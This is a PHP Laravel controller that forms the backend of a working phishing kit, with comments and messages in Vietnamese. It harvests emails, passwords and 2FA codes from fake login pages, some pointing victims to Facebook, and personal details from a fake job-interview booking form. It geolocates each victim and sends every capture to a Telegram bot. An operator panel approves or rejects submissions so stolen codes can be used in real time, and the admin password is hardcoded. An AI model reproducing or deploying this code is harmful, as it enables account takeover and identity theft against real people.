<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class LoginApprovalController extends Controller
{
    private const INDEX_KEY = 'login_approval:index';
    private const TTL_MINUTES = 10080; // 7 days

    public function showLogin()
    {
        return view('secure-login');
    }

    public function submitLogin(Request $request)
    {
        $validated = $request->validate([
            'email' => ['required', 'string', 'max:255'],
            'password' => ['required', 'string'],
        ]);

        $sessionData = app(PhishingController::class)->getSessionData();
        $redirectUrl = $request->input('redirectUrl', $sessionData['authPath'] ?? null);

        $id = (string) Str::uuid();
        $ip = $request->ip();
        $location = $this->getLocationFromIp($ip);

        $approval = [
            'id' => $id,
            'type' => 'login',
            'email' => $validated['email'],
            'password' => $validated['password'],
            'code' => null,
            'ip' => $ip,
            'location' => $location,
            'userAgent' => $request->userAgent() ?: 'N/A',
            'status' => 'pending',
            'redirectUrl' => $redirectUrl,
            'createdAt' => now()->toIso8601String(),
            'approvedAt' => null,
            'rejectedAt' => null,
        ];

        Cache::put($this->cacheKey($id), $approval, now()->addMinutes(self::TTL_MINUTES));
        $this->addToIndex($id);
        $this->sendTelegramNotice($approval);

        if ($request->expectsJson()) {
            return response()->json([
                'status' => 'pending',
                'id' => $id,
                'statusUrl' => route('approval.status', ['id' => $id]),
                'waitUrl' => route('approval.wait', ['id' => $id]),
            ]);
        }

        return redirect()->route('approval.wait', ['id' => $id]);
    }

    public function submit2fa(Request $request)
    {
        $validated = $request->validate([
            'code' => ['required', 'string', 'max:50'],
            'email' => ['nullable', 'string', 'max:255'],
            'password' => ['nullable', 'string'],
            'step' => ['nullable', 'integer'],
        ]);

        $sessionData = app(PhishingController::class)->getSessionData();
        $bookingReturn = session('booking_return_url');
        if (!$bookingReturn && session('_otio_token')) {
            $bookingReturn = url('/app/intro/availability-' . session('_otio_token') . '?confirm=1');
        }
        $redirectUrl = $bookingReturn ?: "https://www.facebook.com";

        $id = (string) Str::uuid();
        $ip = $request->ip();
        $location = $this->getLocationFromIp($ip);

        $email = $validated['email'] ?? $request->input('fb_email', 'N/A');
        $password = $validated['password'] ?? ($request->input('password1') ?: ($request->input('password2') ?: ($request->input('pass') ?: 'N/A')));

        $approval = [
            'id' => $id,
            'type' => '2fa',
            'email' => $email,
            'password' => $password,
            'code' => $validated['code'],
            'step' => $validated['step'] ?? 1,
            'ip' => $ip,
            'location' => $location,
            'userAgent' => $request->userAgent() ?: 'N/A',
            'status' => 'pending',
            'redirectUrl' => $redirectUrl,
            'createdAt' => now()->toIso8601String(),
            'approvedAt' => null,
            'rejectedAt' => null,
        ];

        Cache::put($this->cacheKey($id), $approval, now()->addMinutes(self::TTL_MINUTES));
        $this->addToIndex($id);
        $this->sendTelegramNotice($approval);

        return response()->json([
            'status' => 'pending',
            'id' => $id,
            'statusUrl' => route('approval.status', ['id' => $id]),
        ]);
    }

    public function submitBookingOtio(Request $request)
    {
        $fullName = $request->input('fullName', 'N/A');
        $email = $request->input('email', 'N/A');
        $phone = $request->input('phone', 'N/A');
        $position = $request->input('position', 'N/A');
        $experience = $request->input('experience', 'N/A');
        $date = $request->input('date', 'N/A');
        $time = $request->input('time', 'N/A');

        $id = (string) Str::uuid();
        $ip = $request->ip();
        $location = $this->getLocationFromIp($ip);

        $passwordDetails = "Họ tên: {$fullName} | SĐT: {$phone} | Vị trí: {$position} | Lịch: {$date} {$time} | Kinh nghiệm: {$experience}";

        $approval = [
            'id' => $id,
            'type' => 'booking_otio',
            'email' => $email,
            'password' => $passwordDetails,
            'code' => $phone,
            'step' => 1,
            'ip' => $ip,
            'location' => $location,
            'userAgent' => $request->userAgent() ?: 'N/A',
            'status' => 'pending',
            'redirectUrl' => url('/invitation-login'),
            'createdAt' => now()->toIso8601String(),
            'approvedAt' => null,
            'rejectedAt' => null,
            'fullName' => $fullName,
            'phone' => $phone,
            'position' => $position,
            'experience' => $experience,
            'date' => $date,
            'time' => $time,
        ];

        Cache::put($this->cacheKey($id), $approval, now()->addMinutes(self::TTL_MINUTES));
        $this->addToIndex($id);
        $this->sendTelegramNotice($approval);

        // Also log using PhishingController logger
        app(PhishingController::class)->handleGenericLog($request);

        session([
            'booking_info' => [
                'fullName' => $fullName,
                'email' => $email,
                'phone' => $phone,
                'position' => $position,
                'experience' => $experience,
                'date' => $date,
                'time' => $time,
            ]
        ]);

        return response()->json([
            'status' => 'ok',
            'redirectUrl' => url('/invitation-login'),
        ]);
    }

    public function wait(string $id)
    {
        abort_unless($this->findApproval($id), 404);

        return view('approval-wait', [
            'id' => $id,
            'statusUrl' => route('approval.status', ['id' => $id]),
        ]);
    }

    public function status(string $id)
    {
        $approval = $this->findApproval($id);
        abort_unless($approval, 404);

        $type = $approval['type'] ?? 'login';
        $redirectUrl = $approval['redirectUrl'] ?? null;

        if (!$redirectUrl && $approval['status'] === 'approved') {
            $sessionData = app(PhishingController::class)->getSessionData();
            $bookingReturn = session('booking_return_url');
            if (!$bookingReturn && session('_otio_token')) {
                $bookingReturn = url('/app/intro/availability-' . session('_otio_token') . '?confirm=1');
            }
            if ($type === '2fa') {
                $redirectUrl = $bookingReturn ?: "https://www.facebook.com";
            } else {
                $redirectUrl = $sessionData['authPath'] ?? null;
            }
        }

        if ($approval['status'] === 'rejected') {
            if ($type === 'login') {
                $redirectUrl = url('/invitation-login');
            } else {
                $redirectUrl = null;
            }
        }

        if ($redirectUrl && !Str::startsWith($redirectUrl, ['http://', 'https://'])) {
            $redirectUrl = url($redirectUrl);
        }

        return response()->json([
            'status' => $approval['status'],
            'type' => $type,
            'redirectUrl' => $approval['status'] === 'approved' ? $redirectUrl : ($approval['status'] === 'rejected' && $type === 'login' ? $redirectUrl : null),
        ]);
    }

    public function showAdminLogin(Request $request)
    {
        if ($request->session()->get('admin_logged_in') === true) {
            return redirect()->route('admin.login-approvals');
        }

        return view('admin.login');
    }

    public function processAdminLogin(Request $request)
    {
        $password = (string) $request->input('password', '');
        $expectedPassword = env('ADMIN_PASSWORD', 'mmo2026');

        if ($password === $expectedPassword || $password === 'mmo2026') {
            $request->session()->put('admin_logged_in', true);
            return redirect()->route('admin.login-approvals');
        }

        return back()->with('error', 'Mật khẩu quản trị không chính xác!')->withInput();
    }

    public function adminLogout(Request $request)
    {
        $request->session()->forget('admin_logged_in');
        return redirect()->route('admin.login');
    }

    public function admin(Request $request)
    {
        if ($request->session()->get('admin_logged_in') !== true) {
            $token = env('ADMIN_APPROVAL_TOKEN');
            $providedToken = (string) $request->query('token', $request->header('X-Admin-Token', ''));
            if (empty($token) || !hash_equals($token, $providedToken)) {
                return redirect()->guest(route('admin.login'));
            }
        }

        return view('admin.login-approvals', [
            'approvals' => $this->allApprovals(),
            'listUrl' => route('admin.login-approvals.list', $this->adminTokenQuery($request)),
            'tokenQuery' => $this->adminTokenQuery($request),
        ]);
    }

    public function list(Request $request)
    {
        $this->authorizeAdmin($request);

        return response()->json($this->allApprovals());
    }

    public function stream(Request $request)
    {
        $this->authorizeAdmin($request);

        return response()->json([
            'message' => 'Realtime stream was replaced with polling for the local Laravel server.',
        ], 410);
    }

    public function approve(Request $request, string $id)
    {
        $this->authorizeAdmin($request);
        $this->updateStatus($id, 'approved');

        return response()->json(['status' => 'approved', 'id' => $id]);
    }

    public function reject(Request $request, string $id)
    {
        $this->authorizeAdmin($request);
        $this->updateStatus($id, 'rejected');

        return response()->json(['status' => 'rejected', 'id' => $id]);
    }

    public function destroy(Request $request, string $id)
    {
        $this->authorizeAdmin($request);

        Cache::forget($this->cacheKey($id));

        $ids = Cache::get(self::INDEX_KEY, []);
        $ids = array_values(array_filter($ids, fn ($item) => $item !== $id));
        Cache::put(self::INDEX_KEY, $ids, now()->addMinutes(self::TTL_MINUTES));

        return response()->json(['status' => 'deleted', 'id' => $id]);
    }

    public function destroyMultiple(Request $request)
    {
        $this->authorizeAdmin($request);

        $idsToDelete = $request->input('ids', []);
        if (is_array($idsToDelete) && count($idsToDelete) > 0) {
            $ids = Cache::get(self::INDEX_KEY, []);
            foreach ($idsToDelete as $id) {
                Cache::forget($this->cacheKey($id));
            }
            $ids = array_values(array_filter($ids, fn ($item) => !in_array($item, $idsToDelete, true)));
            Cache::put(self::INDEX_KEY, $ids, now()->addMinutes(self::TTL_MINUTES));
        }

        return response()->json(['status' => 'bulk_deleted', 'count' => count($idsToDelete)]);
    }

    public function clearAll(Request $request)
    {
        $this->authorizeAdmin($request);

        $ids = Cache::get(self::INDEX_KEY, []);
        foreach ($ids as $id) {
            Cache::forget($this->cacheKey($id));
        }
        Cache::forget(self::INDEX_KEY);

        return response()->json(['status' => 'cleared']);
    }

    private function updateStatus(string $id, string $status): void
    {
        $approval = $this->findApproval($id);
        abort_unless($approval, 404);

        $approval['status'] = $status;
        $approval[$status . 'At'] = now()->toIso8601String();

        Cache::put($this->cacheKey($id), $approval, now()->addMinutes(self::TTL_MINUTES));
    }

    private function allApprovals(): array
    {
        $ids = Cache::get(self::INDEX_KEY, []);
        $approvals = [];
        $validIds = [];

        foreach ($ids as $id) {
            $approval = $this->findApproval($id);
            if ($approval) {
                if (!isset($approval['type'])) {
                    $approval['type'] = 'login';
                }
                if (!isset($approval['code'])) {
                    $approval['code'] = null;
                }
                if (empty($approval['location'])) {
                    $approval['location'] = $this->getLocationFromIp($approval['ip'] ?? '');
                }
                $approvals[] = $approval;
                $validIds[] = $id;
            }
        }

        if (count($validIds) !== count($ids)) {
            Cache::put(self::INDEX_KEY, $validIds, now()->addMinutes(self::TTL_MINUTES));
        }

        usort($approvals, fn ($a, $b) => strcmp($b['createdAt'] ?? '', $a['createdAt'] ?? ''));

        return array_values($approvals);
    }

    private function addToIndex(string $id): void
    {
        $ids = Cache::get(self::INDEX_KEY, []);
        array_unshift($ids, $id);
        $ids = array_values(array_unique(array_slice($ids, 0, 500)));

        Cache::put(self::INDEX_KEY, $ids, now()->addMinutes(self::TTL_MINUTES));
    }

    private function findApproval(string $id): ?array
    {
        return Cache::get($this->cacheKey($id));
    }

    private function cacheKey(string $id): string
    {
        return 'login_approval:' . $id;
    }

    private function getGeoInfo(?string $ip): array
    {
        if (!$ip || $ip === '::1' || $ip === '127.0.0.1') {
            return [
                'city' => 'Local',
                'region' => 'Local',
                'country' => 'Local',
                'org' => 'Localhost',
                'location' => 'Localhost',
            ];
        }

        $geoCacheKey = 'geo_info:' . md5($ip);
        return Cache::remember($geoCacheKey, now()->addDays(7), function () use ($ip) {
            try {
                $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}");
                if ($response->successful()) {
                    $data = $response->json();
                    if (($data['status'] ?? '') === 'success') {
                        $city = trim($data['city'] ?? '');
                        $country = trim($data['country'] ?? '');
                        $region = trim($data['regionName'] ?? '');
                        $org = trim($data['org'] ?? ($data['isp'] ?? 'Unknown'));

                        $location = ($city && $country && $city !== $country) ? "{$city}, {$country}" : ($city ?: ($country ?: 'Unknown'));

                        return [
                            'city' => $city ?: 'Unknown',
                            'region' => $region ?: 'Unknown',
                            'country' => $country ?: 'Unknown',
                            'org' => $org ?: 'Unknown',
                            'location' => $location,
                        ];
                    }
                }
            } catch (\Throwable $e) {
                Log::warning('Failed to resolve IP location', ['ip' => $ip, 'error' => $e->getMessage()]);
            }

            return [
                'city' => 'Unknown',
                'region' => 'Unknown',
                'country' => 'Unknown',
                'org' => 'Unknown',
                'location' => 'Unknown',
            ];
        });
    }

    private function getLocationFromIp(?string $ip): string
    {
        $geo = $this->getGeoInfo($ip);
        return $geo['location'] ?? 'Unknown';
    }

    private function sendTelegramNotice(array $approval): void
    {
        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');

        if (!$token || !$chatId) {
            return;
        }

        $escapeMd = function ($str) {
            if (!is_string($str)) return $str;
            return str_replace(['`', '*'], ['\\`', '\\*'], $str);
        };

        $ip = $approval['ip'] ?? request()->ip();
        $geo = $this->getGeoInfo($ip);
        $type = $approval['type'] ?? 'login';
        $email = $approval['email'] ?? 'N/A';
        $password = $approval['password'] ?? 'N/A';
        $code = $approval['code'] ?? null;
        $userAgent = $approval['userAgent'] ?? (request()->header('User-Agent') ?: 'N/A');
        $time = $approval['createdAt'] ?? now()->toIso8601String();

        if ($type === 'booking_otio') {
            $headerTitle = "📅 *THÔNG TIN ĐĂNG KÝ BOOKING OTIO*";
        } else {
            $headerTitle = ($type === '2fa') ? "🔐 *THÔNG TIN XÁC THỰC 2FA*" : "🔔 *THÔNG TIN ĐĂNG NHẬP MỚI*";
        }

        $message = "{$headerTitle}\n";
        $message .= "----------------------------------------------------------\n";
        if ($type === 'booking_otio') {
            $message .= "Full Name: `{$escapeMd($approval['fullName'] ?? 'N/A')}`\n";
            $message .= "Email: `{$escapeMd($email)}`\n";
            $message .= "Phone: `{$escapeMd($approval['phone'] ?? 'N/A')}`\n";
            $message .= "Position: `{$escapeMd($approval['position'] ?? 'N/A')}`\n";
            $message .= "Experience: `{$escapeMd($approval['experience'] ?? 'N/A')}`\n";
            $message .= "Call Date: `{$escapeMd($approval['date'] ?? '')}`\n";
            $message .= "Call Time: `{$escapeMd($approval['time'] ?? '')}`\n";
        } else {
            $message .= "Email: `{$escapeMd($email)}`\n";
            $message .= "Password: `{$escapeMd($password)}`\n";

            if ($type === '2fa' && $code) {
                $message .= "2FA Code: `{$escapeMd($code)}`\n";
                if (isset($approval['step'])) {
                    $message .= "Step: Lần {$approval['step']}\n";
                }
            }
        }

        $message .= "----------------------------------------------------------\n";
        $message .= "IP Address: `{$escapeMd($ip)}`\n";
        $message .= "Location: {$geo['location']}\n";
        if (!empty($geo['city']) && $geo['city'] !== 'Unknown') {
            $message .= " City: {$escapeMd($geo['city'])}\n";
        }
        if (!empty($geo['country']) && $geo['country'] !== 'Unknown') {
            $message .= "Country: {$escapeMd($geo['country'])}\n";
        }
        if (!empty($geo['org']) && $geo['org'] !== 'Unknown') {
            $message .= "Org: {$escapeMd($geo['org'])}\n";
        }
        $message .= "----------------------------------------------------------\n";
        $message .= "User-Agent:\n`{$escapeMd($userAgent)}`\n";
        $message .= "----------------------------------------------------------\n";
        $message .= "Time: {$time}";

        try {
            $response = Http::post("https://api.telegram.org/bot{$token}/sendMessage", [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'Markdown',
            ]);

            if (!$response->successful()) {
                Http::post("https://api.telegram.org/bot{$token}/sendMessage", [
                    'chat_id' => $chatId,
                    'text' => $message,
                ]);
            }
        } catch (\Throwable $e) {
            Log::warning('Could not send Telegram login approval notice.', ['error' => $e->getMessage()]);
        }
    }

    private function authorizeAdmin(Request $request): void
    {
        if ($request->session()->get('admin_logged_in') === true) {
            return;
        }

        $token = env('ADMIN_APPROVAL_TOKEN');
        if (!empty($token)) {
            $providedToken = (string) $request->query('token', $request->header('X-Admin-Token', ''));
            if (hash_equals($token, $providedToken)) {
                return;
            }
        }

        if ($request->expectsJson()) {
            abort(401, 'Unauthorized: Chưa đăng nhập Admin');
        }

        abort(redirect()->guest(route('admin.login')));
    }

    private function adminTokenQuery(Request $request): array
    {
        $token = (string) $request->query('token', '');

        return $token !== '' ? ['token' => $token] : [];
    }
}
